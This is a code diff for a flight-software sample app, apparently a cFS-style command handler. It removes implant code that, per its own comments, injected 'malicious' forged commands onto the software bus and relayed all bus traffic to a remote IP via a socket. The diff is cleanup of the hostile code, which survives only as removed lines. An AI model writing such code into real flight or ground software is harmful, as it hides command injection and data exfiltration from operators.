@@ -74,34 +74,15 @@ bool SAMPLE_APP_VerifyCmdLength(const CFE_MSG_Message_t *MsgPtr, size_t Expected
 void SAMPLE_APP_ProcessGroundCommand(const CFE_SB_Buffer_t *SBBufPtr)
 {
     CFE_MSG_FcnCode_t CommandCode = 0;
+
     CFE_MSG_GetFcnCode(&SBBufPtr->Msg, &CommandCode);
-
-    /*
-    ** Set potential messages to be sent here in hex format
-    ** Basically theyre in reverse from what the ground system outputs
-    ** So now when sample receives the "kill signal" it can run the malicious commands (when i find them)
-    */
-
-    /*
-    ** Change potMsg to desired command, maybe make multiple potential messages
-    ** Then below inside of switch transmit command onto buffer
-    ** Example: long long int potMsg = 0xa400010000c08218;
-    */
-
-    long long int potMsg = 0x2000010000c00618; // es_noop
-    long long int buffer = potMsg;
-
-    CFE_MSG_Message_t* MsgPtr = (CFE_MSG_Message_t *) &(potMsg);
 
     /*
     ** Process SAMPLE app ground commands
     */
-
-    switch (CommandCode) // commandCode is number 0-X for different commands
+    switch (CommandCode)
     {
         case SAMPLE_APP_NOOP_CC:
-
-            CFE_SB_TransmitMsg(MsgPtr, true); // Malicious message here
             if (SAMPLE_APP_VerifyCmdLength(&SBBufPtr->Msg, sizeof(SAMPLE_APP_NoopCmd_t)))
             {
                 SAMPLE_APP_NoopCmd((const SAMPLE_APP_NoopCmd_t *)SBBufPtr);
@@ -109,9 +90,6 @@ void SAMPLE_APP_ProcessGroundCommand(const CFE_SB_Buffer_t *SBBufPtr)
             break;
 
         case SAMPLE_APP_RESET_COUNTERS_CC:
-
-            send_to_socket(REMOTE_IP, REMOTE_PORT, &buffer, sizeof(buffer));
-
             if (SAMPLE_APP_VerifyCmdLength(&SBBufPtr->Msg, sizeof(SAMPLE_APP_ResetCountersCmd_t)))
             {
                 SAMPLE_APP_ResetCountersCmd((const SAMPLE_APP_ResetCountersCmd_t *)SBBufPtr);
@@ -130,17 +108,6 @@ void SAMPLE_APP_ProcessGroundCommand(const CFE_SB_Buffer_t *SBBufPtr)
             {
                 SAMPLE_APP_DisplayParamCmd((const SAMPLE_APP_DisplayParamCmd_t *)SBBufPtr);
             }
-            break;
-        case SAMPLE_APP_SEND_PIPES_CC:
-            find_pipes();
-//            CFE_SB_TransmitMsg(MsgPtr, true); // test for now
-            CFE_EVS_SendEvent(SAMPLE_APP_CC_ERR_EID, CFE_EVS_EventType_ERROR, "Send pipe comand code: CC = %d",
-                              CommandCode);
-            break;
-        case SAMPLE_APP_SEND_SB_CC:
-            relay_data = !relay_data;
-            CFE_EVS_SendEvent(SAMPLE_APP_CC_ERR_EID, CFE_EVS_EventType_ERROR, "Send SB comand code: CC = %d",
-                              CommandCode);
             break;
 
         /* default case already found during FC vs length test */
@@ -164,19 +131,6 @@ void SAMPLE_APP_TaskPipe(const CFE_SB_Buffer_t *SBBufPtr)
 
     CFE_MSG_GetMsgId(&SBBufPtr->Msg, &MsgId);
 
-
-    /*
-    ** Print any commands sent on buffer since sample is subscribed to all major headers
-    */
-
-//    CFE_ES_WriteToSysLog("Sample App: Command Packet: 0x%x\n", (unsigned int)CFE_SB_MsgIdToValue(MsgId));
-//    CFE_ES_WriteToSysLog("Sample App: Command Info: %llx", (long long int)SBBufPtr->LongInt);
-
-    if (relay_data)
-    {
-        long long int msg = (long long int)SBBufPtr->LongInt;
-        send_to_socket(REMOTE_IP, REMOTE_PORT, &msg, sizeof(msg));
-    }
     switch (CFE_SB_MsgIdToValue(MsgId))
     {
         case SAMPLE_APP_CMD_MID:
@@ -188,8 +142,8 @@ void SAMPLE_APP_TaskPipe(const CFE_SB_Buffer_t *SBBufPtr)
             break;
 
         default:
-//            CFE_EVS_SendEvent(SAMPLE_APP_MID_ERR_EID, CFE_EVS_EventType_ERROR,
-//                              "SAMPLE: invalid command packet,MID = 0x%x", (unsigned int)CFE_SB_MsgIdToValue(MsgId));
+            CFE_EVS_SendEvent(SAMPLE_APP_MID_ERR_EID, CFE_EVS_EventType_ERROR,
+                              "SAMPLE: invalid command packet,MID = 0x%x", (unsigned int)CFE_SB_MsgIdToValue(MsgId));
             break;
     }
 }
